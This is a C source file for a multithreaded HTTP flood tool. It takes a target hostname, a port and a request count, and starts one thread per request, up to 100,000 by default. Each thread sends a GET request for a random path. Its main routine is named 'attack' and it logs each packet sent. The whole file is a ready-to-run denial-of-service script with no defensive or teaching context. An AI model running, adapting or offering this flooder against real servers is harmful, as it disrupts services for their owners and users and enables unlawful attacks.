#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pthread.h>
#include <time.h>

#define BUFFER_SIZE 1024

char *host;
char ip[100];
int port = 80;
int num_requests = 100000; //default
int thread_num = 0;
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

void print_status() {
    pthread_mutex_lock(&mutex);
    thread_num++;
    printf("\033[1;93m[%s] \033[1;92mPacket sent -> %d\n", __TIME__, thread_num);
    fflush(stdout);
    pthread_mutex_unlock(&mutex);
}

void generate_url_path(char *path) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()";
    for (int i = 0; i < 10; i++) {
        path[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    path[10] = '\0';
}

void *attack(void *arg) {
    print_status();
    char url_path[11];
    generate_url_path(url_path);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        pthread_exit(NULL);
    }

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        pthread_exit(NULL);
    }

    char request[BUFFER_SIZE];
    snprintf(request, sizeof(request), "GET /%s HTTP/1.1\r\nHost: %s\r\n\r\n", url_path, host);
    if (send(sock, request, strlen(request), 0) < 0) {
        perror("Send failed");
    }

    shutdown(sock, SHUT_RDWR);
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc < 2 || argc > 4) {
        fprintf(stderr, "\033[1;91mUsage: %s <Hostname> <Port> <Num_of_request>\n", argv[0]);
        return 1;
    }

    host = argv[1];
    if (argc >= 3) {
        port = atoi(argv[2]);
    }
    if (argc == 4) {
        num_requests = atoi(argv[3]);
    }

    struct hostent *he = gethostbyname(host);
    if (he == NULL) {
        fprintf(stderr, "\033[1;91m[!] Error: Could not resolve hostname\n");
        return 2;
    }
    strcpy(ip, inet_ntoa(*(struct in_addr *)he->h_addr_list[0]));

    printf("\033[1;94m[*] Requests: %d\n", num_requests);
    printf("\033[1;94m[*] Target: %s (%s)\n", host, ip);
    printf("\033[1;94m[*] Port: %d\n", port);
    sleep(3);
    pthread_t threads[num_requests];
    for (int i = 0; i < num_requests; i++) {
        if (pthread_create(&threads[i], NULL, attack, NULL) != 0) {
            perror("\033[1;91m[!] Failed to create threads");
        }
        usleep(1000); // 1ms thread creation
    }

    for (int i = 0; i < num_requests; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}

